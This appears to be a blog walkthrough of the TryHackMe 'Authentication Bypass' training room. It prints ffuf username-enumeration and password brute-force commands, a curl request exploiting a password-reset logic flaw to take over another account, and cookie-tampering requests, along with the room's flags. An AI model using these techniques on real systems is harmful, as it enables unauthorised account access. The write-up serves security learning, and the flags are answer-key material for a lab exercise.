---
title: Authentication Bypass  
author: CYB3RM3
name: CYB3RM3 | Authentication Bypass  
date: 2021-10-03 17:04:02 +0100
categories: [TryHackMe, Web]
tags: [Web, Authentication Bypass]
---

THM Room [https://tryhackme.com/room/authenticationbypass](https://tryhackme.com/room/authenticationbypass)



## TASK 1 : Brief
### I have started the machine.
No answer

## TASK 2 : Username Enumeration
###  What is the username starting with si*** ?

```console
root@ip-10-10-40-168:~/Desktop/auth# ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.62.175/customers/signup -mr "username already exists" > valid_usernames.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.62.175/customers/signup
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&email=x&password=x&cpassword=x
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: username already exists
________________________________________________

:: Progress: [10164/10164] :: Job [1/1] :: 1639 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
root@ip-10-10-40-168:~/Desktop/auth# cat valid_usernames.txt 
admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77]
simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77]      
```
{: .nolineno }

Answer : simon

### What is the username starting with st*** ?
Answer : steve

### What is the username starting with ro**** ?
Answer : robert

## TASK 3 : Brute Force 
### What is the valid username and password (format: username/password)?

```console
root@ip-10-10-40-168:~/Desktop/auth# ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.62.175/customers/login -fc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.62.175/customers/login
 :: Wordlist         : W1: valid_usernames.txt
 :: Wordlist         : W2: /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=W1&password=W2
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 200
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1]
    * W1: steve
    * W2: thunder

:: Progress: [400/400] :: Job [1/1] :: 121 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```
{: .nolineno }

Answer : steve/thunder

## TASK 4 : Logic Flaw 
### What is the flag from Robert's support ticket?

First create an account on ACME portal then log on and run the curl request with your own email : 

```console
root@ip-10-10-40-168:~/Desktop/auth# curl 'http://10.10.62.175/customers/reset?email=robert%40acmeitsupport.thm' -Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=john@customer.acmeitsupport.thm'
<!DOCTYPE html>
<html lang="en">
[...]
                        <div class="alert alert-success text-center">
                <p>We'll send you a reset email to <strong>john@customer.acmeitsupport.thm</strong></p>
            </div>
[...]
```
{: .nolineno }

![Account](/images/thm/authenticationbypass/authenticationbypass_1.png)
_Account_

You now have a open ticket : 

![Open Ticket](/images/thm/authenticationbypass/authenticationbypass_2.png)
_Open Ticket_

Following this link leads you to robert account :

![Robert Account](/images/thm/authenticationbypass/authenticationbypass_3.png)
_Robert Account_

Opening this thicket gives you the flag :

![Flag](/images/thm/authenticationbypass/authenticationbypass_4.png)
_Flag_

Answer : THM{AUTH_BYPASS_COMPLETE} 

## TASK 5 : Cookie Tampering
### What is the flag from changing the plain text cookie values?

```console
root@ip-10-10-40-168:~/Desktop/auth# curl http://10.10.62.175/cookie-test
Not Logged In
root@ip-10-10-40-168:~/Desktop/auth# curl -H "Cookie: logged_in=true; admin=false" http://10.10.62.175/cookie-test
Logged In As A User
root@ip-10-10-40-168:~/Desktop/auth# curl -H "Cookie: logged_in=true; admin=true" http://10.10.62.175/cookie-test
Logged In As An Admin - THM{COOKIE_TAMPERING}
```
{: .nolineno }

Answer : THM{COOKIE_TAMPERING}

### What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?
Using CrackStation <https://crackstation.net/> :

![Crackstation](/images/thm/authenticationbypass/authenticationbypass_5.png)
_Crackstation_

Answer : 463729

### What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?

With the help of CyberChef <https://gchq.github.io/CyberChef> (can be done in terminal too with "base64 -d") :

![Base64 Decode](/images/thm/authenticationbypass/authenticationbypass_6.png)
_Base64 Decode_

Answer : THM{BASE64_ENCODING}

### Encode the following value using base64 {"id":1,"admin":true}
![Base64 Encode](/images/thm/authenticationbypass/authenticationbypass_7.png)
_Base64 Encode_

Answer : eyJpZCI6MSwiYWRtaW4iOnRydWV9